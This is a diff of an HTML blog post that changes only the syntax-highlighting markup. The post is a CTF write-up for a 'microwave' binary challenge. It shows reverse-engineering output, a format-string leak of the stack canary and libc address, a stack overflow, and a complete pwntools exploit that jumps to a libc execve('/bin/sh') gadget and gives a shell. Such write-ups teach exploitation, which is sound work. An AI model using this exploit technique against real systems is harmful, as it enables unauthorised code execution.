@@ -70,34 +70,34 @@ and tweets your favorite food.</p>
 <li>(4) <em>Exit</em></li>
 </ul>
 <p>Connect to twitter:</p>
-<div class="highlight"><pre> <span class="o">--------------------------------------------------------</span>
- <span class="o">|</span>     <span class="nx">Welcome</span> <span class="nx">to</span> <span class="nx">the</span> <span class="nx">next</span> <span class="nx">generation</span> <span class="nx">of</span> <span class="nx">MicroWaves</span><span class="o">!</span>    <span class="o">|</span>
- <span class="o">|</span>                         <span class="o">***</span>                          <span class="o">|</span>
- <span class="o">|</span> <span class="nx">This</span> <span class="nx">stylish</span> <span class="nx">Microwave</span> <span class="kd">with</span> <span class="nx">Grill</span> <span class="kd">function</span><span class="p">,</span> <span class="nx">includes</span> <span class="o">|</span>
- <span class="o">|</span>      <span class="nx">a</span> <span class="kd">function</span> <span class="nx">that</span> <span class="nx">tweets</span> <span class="nx">your</span> <span class="nx">favourite</span> <span class="nx">food</span><span class="o">!</span>     <span class="o">|</span>
- <span class="o">|</span>                         <span class="o">***</span>                          <span class="o">|</span>
- <span class="o">--------------------------------------------------------</span>
-           <span class="o">----------------------------------</span>
-           <span class="o">|</span>  <span class="mi">1</span><span class="p">.</span> <span class="nx">Connect</span> <span class="nx">to</span> <span class="nx">Twitter</span> <span class="nx">account</span> <span class="o">|</span>
-           <span class="o">|</span>  <span class="mi">2</span><span class="p">.</span> <span class="nx">Edit</span> <span class="nx">your</span> <span class="nx">tweet</span>            <span class="o">|</span>
-           <span class="o">|</span>  <span class="mi">3</span><span class="p">.</span> <span class="nx">Grill</span> <span class="o">&amp;</span> <span class="nx">Tweet</span> <span class="nx">your</span> <span class="nx">food</span>    <span class="o">|</span>
-           <span class="o">|</span>  <span class="nx">q</span><span class="p">.</span> <span class="nx">Exit</span>                       <span class="o">|</span>
-           <span class="o">----------------------------------</span>
+<div class="highlight"><pre><span></span> --------------------------------------------------------
+ |     Welcome to the next generation of MicroWaves!    |
+ |                         ***                          |
+ | This stylish Microwave with Grill function, includes |
+ |      a function that tweets your favourite food!     |
+ |                         ***                          |
+ --------------------------------------------------------
+           ----------------------------------
+           |  1. Connect to Twitter account |
+           |  2. Edit your tweet            |
+           |  3. Grill &amp; Tweet your food    |
+           |  q. Exit                       |
+           ----------------------------------
 
-           <span class="cp">[</span><span class="nx">MicroWave</span><span class="cp">]</span><span class="o">:</span> <span class="mi">1</span>
+           [MicroWave]: 1
 
-           <span class="nx">Log</span> <span class="k">in</span> <span class="nx">on</span> <span class="nx">Twitter</span><span class="o">:</span>
-           <span class="nx">username</span><span class="o">:</span> <span class="nx">test</span>
-           <span class="nx">password</span><span class="o">:</span> <span class="nx">test</span>
+           Log in on Twitter:
+           username: test
+           password: test
 
-<span class="nx">Checking</span> <span class="nx">test</span>
-<span class="nx">Twitter</span> <span class="nx">account</span>
-<span class="p">...</span>
+Checking test
+Twitter account
+...
 </pre></div>
 
 
 <p>Edit your tweet:</p>
-<div class="highlight"><pre>           ----------------------------------
+<div class="highlight"><pre><span></span>           ----------------------------------
            |  1. Connect to Twitter account |
            |  2. Edit your tweet            |
            |  3. Grill &amp; Tweet your food    |
@@ -113,7 +113,7 @@ and tweets your favorite food.</p>
 
 
 <p>Grill and tweet:</p>
-<div class="highlight"><pre>           ----------------------------------
+<div class="highlight"><pre><span></span>           ----------------------------------
            |  1. Connect to Twitter account |
            |  2. Edit your tweet            |
            |  3. Grill &amp; Tweet your food    |
@@ -130,7 +130,7 @@ and tweets your favorite food.</p>
 
 
 <p>Here are the protections of the binary</p>
-<div class="highlight"><pre><span class="nv">$ </span>checksec microwave_61f50dba931bb10ab3089215b2e188f4
+<div class="highlight"><pre><span></span>$ checksec microwave_61f50dba931bb10ab3089215b2e188f4
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/tmp/microwave_61f50dba931bb10ab3089215b2e188f4&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Full RELRO
@@ -147,7 +147,7 @@ and tweets your favorite food.</p>
 twitter account. The username can be anything, however the function
 containing the <em>Checking</em> string shows where the password is checked
 (and what it is):</p>
-<div class="highlight"><pre><span class="p">[</span><span class="mh">0x00000ac0</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">iz</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">Checking</span>
+<div class="highlight"><pre><span></span><span class="p">[</span><span class="mh">0x00000ac0</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">iz</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">Checking</span>
 <span class="p">[</span><span class="mh">0x00000ac0</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">axt</span> <span class="mh">0x00002ac0</span>
 <span class="n">data</span> <span class="mh">0xf03</span> <span class="n">lea</span> <span class="n">rsi</span><span class="p">,</span> <span class="p">[</span><span class="n">rip</span> <span class="o">+</span> <span class="mh">0x1bb6</span><span class="p">]</span> <span class="k">in</span> <span class="n">sub</span><span class="p">.</span><span class="n">__printf_chk_f00</span>
 <span class="p">[</span><span class="mh">0x00000ac0</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pd</span> <span class="mh">@0xf03</span>
@@ -189,7 +189,7 @@ It was however possible to "see" it using a simple <code>strings</code>.</p>
 <h3>Vuln1: string format</h3>
 <p>The first vulnerability is a string format on the username when
 connecting to twitter:</p>
-<div class="highlight"><pre> --------------------------------------------------------
+<div class="highlight"><pre><span></span> --------------------------------------------------------
  <span class="p">|</span>     Welcome to the next generation of MicroWaves!    <span class="p">|</span>
  <span class="p">|</span>                         ***                          <span class="p">|</span>
  <span class="p">|</span> This stylish Microwave with Grill <span class="k">function</span>, includes <span class="p">|</span>
@@ -224,7 +224,7 @@ and will be used later:</p>
 <h3>Vuln2: stack overflow</h3>
 <p>The second vulnerability is triggered when reading the content to tweet.
 It reads from stdin (0) and store the result on the stack</p>
-<div class="highlight"><pre><span class="p">[</span><span class="mh">0x00000ac0</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">iz</span> <span class="o">|</span> <span class="n">grep</span> <span class="err">&#39;#</span><span class="o">&gt;</span><span class="err">&#39;</span>
+<div class="highlight"><pre><span></span><span class="p">[</span><span class="mh">0x00000ac0</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">iz</span> <span class="o">|</span> <span class="n">grep</span> <span class="err">&#39;#</span><span class="o">&gt;</span><span class="err">&#39;</span>
 <span class="n">vaddr</span><span class="o">=</span><span class="mh">0x00002adb</span> <span class="n">paddr</span><span class="o">=</span><span class="mh">0x00002adb</span> <span class="n">ordinal</span><span class="o">=</span><span class="mo">01</span><span class="mi">9</span> <span class="n">sz</span><span class="o">=</span><span class="mi">16</span> <span class="n">len</span><span class="o">=</span><span class="mi">15</span> <span class="n">section</span><span class="o">=</span><span class="p">.</span><span class="n">rodata</span> <span class="n">type</span><span class="o">=</span><span class="n">ascii</span> <span class="n">string</span><span class="o">=</span><span class="err">\</span><span class="n">n</span>           <span class="err">#</span><span class="o">&gt;</span>
 <span class="p">[</span><span class="mh">0x00000ac0</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">axt</span> <span class="mh">0x00002adb</span>
 <span class="n">data</span> <span class="mh">0x1007</span> <span class="n">lea</span> <span class="n">rsi</span><span class="p">,</span> <span class="p">[</span><span class="n">rip</span> <span class="o">+</span> <span class="mh">0x1acd</span><span class="p">]</span> <span class="k">in</span> <span class="n">sub</span><span class="p">.</span><span class="n">__printf_chk_0</span>
@@ -242,7 +242,7 @@ It reads from stdin (0) and store the result on the stack</p>
 <p>We read up to 0x800 (2048) from stdin to the buffer (on the stack).
 If we consider the whole block, only 0x418 (1048) are reserved
 on the stack. We can thus overwrite saved RIP</p>
-<div class="highlight"><pre>sub rsp, 0x418                  | reserve 1048
+<div class="highlight"><pre><span></span>sub rsp, 0x418                  | reserve 1048
 lea rsi, [rip + 0x1acd]         |
 mov edi, 1                      |
 mov rax, qword fs:[0x28]        | get the canary
@@ -275,12 +275,12 @@ jne 0x106a ;[e]
 <p>Due to the protections, one needs to exploit the binary using ROP.
 However looking into the provided libc shows that the <em>magic</em> ROP chain
 is present.</p>
-<div class="highlight"><pre><span class="nl">.text:</span><span class="err">000000000004652</span><span class="nf">C</span> <span class="no">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">cs</span><span class="p">:</span><span class="no">environ_ptr_0</span>
+<div class="highlight"><pre><span></span><span class="nl">.text:</span><span class="err">000000000004652</span><span class="nf">C</span> <span class="no">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">cs</span><span class="p">:</span><span class="no">environ_ptr_0</span>
 <span class="nl">.text:</span><span class="err">0000000000046533</span> <span class="nf">lea</span>     <span class="no">rdi</span><span class="p">,</span> <span class="no">aBinSh</span>     <span class="err">;</span> <span class="err">&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span>
-<span class="nl">.text:</span><span class="err">000000000004653</span><span class="nf">A</span> <span class="no">lea</span>     <span class="no">rsi</span><span class="p">,</span> <span class="err">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">180</span><span class="no">h</span><span class="err">+</span><span class="no">var_150</span><span class="err">]</span>
+<span class="nl">.text:</span><span class="err">000000000004653</span><span class="nf">A</span> <span class="no">lea</span>     <span class="no">rsi</span><span class="p">,</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">180</span><span class="no">h</span><span class="err">+</span><span class="no">var_150</span><span class="p">]</span>
 <span class="nl">.text:</span><span class="err">000000000004653</span><span class="nf">F</span> <span class="no">mov</span>     <span class="no">cs</span><span class="p">:</span><span class="no">dword_3C06C0</span><span class="p">,</span> <span class="mi">0</span>
 <span class="nl">.text:</span><span class="err">0000000000046549</span> <span class="nf">mov</span>     <span class="no">cs</span><span class="p">:</span><span class="no">dword_3C06D0</span><span class="p">,</span> <span class="mi">0</span>
-<span class="nl">.text:</span><span class="err">0000000000046553</span> <span class="nf">mov</span>     <span class="no">rdx</span><span class="p">,</span> <span class="err">[</span><span class="no">rax</span><span class="err">]</span>
+<span class="nl">.text:</span><span class="err">0000000000046553</span> <span class="nf">mov</span>     <span class="no">rdx</span><span class="p">,</span> <span class="p">[</span><span class="no">rax</span><span class="p">]</span>
 <span class="nl">.text:</span><span class="err">0000000000046556</span> <span class="nf">call</span>    <span class="no">execve</span>
 </pre></div>
 
@@ -301,9 +301,9 @@ the base address these are in order to
 retrieve the base address. This base address is then used to refer to the
 magic gadget.</p>
 <p>This is easily done with gdb:</p>
-<div class="highlight"><pre><span class="nv">$ </span>gdb microwave_61f50dba931bb10ab3089215b2e188f4
-gdb-peda<span class="nv">$ </span><span class="nb">set </span>environment <span class="nv">LD_PRELOAD</span><span class="o">=</span>./libc.so.6
-gdb-peda<span class="nv">$ </span>r
+<div class="highlight"><pre><span></span>$ gdb microwave_61f50dba931bb10ab3089215b2e188f4
+gdb-peda$ <span class="nb">set</span> environment <span class="nv">LD_PRELOAD</span><span class="o">=</span>./libc.so.6
+gdb-peda$ r
 Starting program: /tmp/microwave_61f50dba931bb10ab3089215b2e188f4
 
  --------------------------------------------------------
@@ -340,7 +340,7 @@ Twitter account
 Program received signal SIGINT, Interrupt.
 Stopped reason: SIGINT
 0x00007ffff7b02810 in <span class="nb">read</span> <span class="o">()</span> from ./libc.so.6
-gdb-peda<span class="nv">$ </span>vmmap
+gdb-peda$ vmmap
 Start              End                Perm  Name
 0x0000555555554000 0x0000555555557000 r-xp  /tmp/microwave_61f50dba931bb10ab3089215b2e188f4
 0x0000555555757000 0x0000555555758000 r--p  /tmp/microwave_61f50dba931bb10ab3089215b2e188f4
@@ -366,69 +366,69 @@ Start              End                Perm  Name
 <p>The offset is thus <code>hex(0x7ffff7b02870 - 0x00007ffff7a17000) = 0xeb870</code></p>
 <p>Now constructing the exploit using <a href="https://github.com/Gallopsled/pwntools">pwntools</a>.</p>
 <p>Exploit:</p>
-<div class="highlight"><pre><span class="c">#!/usr/bin/env python2</span>
-<span class="c"># author: deadc0de6</span>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python2</span>
+<span class="c1"># author: deadc0de6</span>
 
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s">&#39;amd64&#39;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
 
-<span class="n">PASSWORD</span> <span class="o">=</span> <span class="s">&quot;n07_7h3_fl46&quot;</span>
+<span class="n">PASSWORD</span> <span class="o">=</span> <span class="s2">&quot;n07_7h3_fl46&quot;</span>
 <span class="n">magic_addr</span> <span class="o">=</span> <span class="mh">0x4652c</span>
 <span class="n">base_offset</span> <span class="o">=</span> <span class="mh">0xeb870</span>
 
-<span class="c">#p = remote(&#39;microwave.insomni.hack&#39;, 1337)</span>
-<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+<span class="c1">#p = remote(&#39;microwave.insomni.hack&#39;, 1337)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
 
-<span class="k">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;[MicroWave]: &#39;</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;[MicroWave]: &#39;</span><span class="p">)</span>
 
-<span class="c"># select (1) connect</span>
-<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&quot;1&quot;</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;username: &quot;</span><span class="p">)</span>
+<span class="c1"># select (1) connect</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;username: &quot;</span><span class="p">)</span>
 
-<span class="c"># send username</span>
-<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&quot;%p.&quot;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;password: &quot;</span><span class="p">)</span>
-<span class="c"># send password</span>
+<span class="c1"># send username</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;%p.&quot;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;password: &quot;</span><span class="p">)</span>
+<span class="c1"># send password</span>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">PASSWORD</span><span class="p">)</span>
 
-<span class="c"># read leaked addresses</span>
-<span class="n">ret</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;[MicroWave]: &#39;</span><span class="p">)</span>
-<span class="n">addrs</span> <span class="o">=</span> <span class="n">ret</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;.&#39;</span><span class="p">)</span>
+<span class="c1"># read leaked addresses</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;[MicroWave]: &#39;</span><span class="p">)</span>
+<span class="n">addrs</span> <span class="o">=</span> <span class="n">ret</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
 <span class="k">print</span> <span class="n">addrs</span>
 
-<span class="c"># canary is the sixth element</span>
+<span class="c1"># canary is the sixth element</span>
 <span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">addrs</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
 
-<span class="c"># libc address is the second element</span>
+<span class="c1"># libc address is the second element</span>
 <span class="n">libcaddr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">addrs</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
 <span class="n">libc_base</span> <span class="o">=</span> <span class="n">libcaddr</span> <span class="o">-</span> <span class="n">base_offset</span>
 
-<span class="c"># print some information</span>
-<span class="k">print</span> <span class="s">&#39;canary is </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
-<span class="k">print</span> <span class="s">&quot;libc base: </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
-<span class="k">print</span> <span class="s">&quot;magic addr: </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">magic_addr</span><span class="p">))</span>
+<span class="c1"># print some information</span>
+<span class="k">print</span> <span class="s1">&#39;canary is </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
+<span class="k">print</span> <span class="s2">&quot;libc base: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+<span class="k">print</span> <span class="s2">&quot;magic addr: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">magic_addr</span><span class="p">))</span>
 
-<span class="c"># select (2) send tweet</span>
-<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&quot;2&quot;</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;#&gt; &quot;</span><span class="p">)</span>
+<span class="c1"># select (2) send tweet</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;#&gt; &quot;</span><span class="p">)</span>
 
-<span class="c"># construct the exploit</span>
-<span class="n">buf</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">1032</span>
+<span class="c1"># construct the exploit</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">1032</span>
 <span class="n">buf</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;B&quot;</span><span class="o">*</span><span class="mi">8</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mi">8</span>
 <span class="n">buf</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">magic_addr</span><span class="p">)</span>
 
-<span class="c"># exploit</span>
+<span class="c1"># exploit</span>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">clean</span><span class="p">()</span>
 
-<span class="c"># interact with it</span>
+<span class="c1"># interact with it</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </pre></div>
 
 
 <p>It is then possible to <code>cat</code> the flag.</p>
-<div class="highlight"><pre><span class="nv">$ </span>./microwave-pwn.py
+<div class="highlight"><pre><span></span>$ ./microwave-pwn.py
 <span class="o">[</span>+<span class="o">]</span> Opening connection to 127.0.0.1 on port 1337: Done
 
  --------------------------------------------------------
@@ -451,18 +451,18 @@ canary is 0x4cacfb0061420700
 libc base: 0x7f1922330000
 magic addr: 0x7f192237652c
 
-           <span class="c">#&gt;</span>
+           <span class="c1">#&gt;</span>
 <span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
-<span class="nv">$ </span>ls
+$ ls
 ...
 </pre></div>
 
 
 <p>To reproduce the execution locally, I used socat with the following tweak:</p>
-<div class="highlight"><pre><span class="nv">$ </span>cat doit.sh
-<span class="c">#!/bin/bash</span>
+<div class="highlight"><pre><span></span>$ cat doit.sh
+<span class="c1">#!/bin/bash</span>
 <span class="nv">LD_PRELOAD</span><span class="o">=</span>./libc.so.6 ./microwave_61f50dba931bb10ab3089215b2e188f4
-<span class="nv">$ </span>socat tcp-l:1337,reuseaddr,fork <span class="nb">exec</span>:./doit.sh
+$ socat tcp-l:1337,reuseaddr,fork exec:./doit.sh
 </pre></div>
 
 
